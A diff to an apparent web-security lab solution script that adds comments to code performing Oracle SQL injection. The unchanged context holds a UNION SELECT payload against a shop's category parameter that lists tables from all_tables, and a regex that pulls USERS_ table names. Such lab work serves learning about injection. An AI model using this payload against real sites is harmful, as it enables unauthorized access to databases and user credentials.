@@ -1,3 +1,17 @@
+"""
+You should be sure who [owner] is and edit the place where I marked it.
+
+You can also use method print(resp.text), its look like that:
+                        <tr>
+                            <th>USERS_VHEPIG</th>
+                            <td>PETER</td>
+                        </tr>
+sometimes the word PETER can be replaced by SYSTEM
+
+piece of code:
+line:55
+"""
+
 import sys
 import logging
 import urllib3
@@ -37,6 +51,12 @@ def main(args):
     resp = shop.get_category(
         f"' UNION SELECT {nulls} FROM all_tables where owner='PETER'-- "
     )
+    """
+    !!!
+    be careful with the request.
+    read the initial code
+    !!!
+    """
     #for debug
     #log.info("DDODO")
     pattern = re.compile(r"<th>(USERS_.*?)</th>")
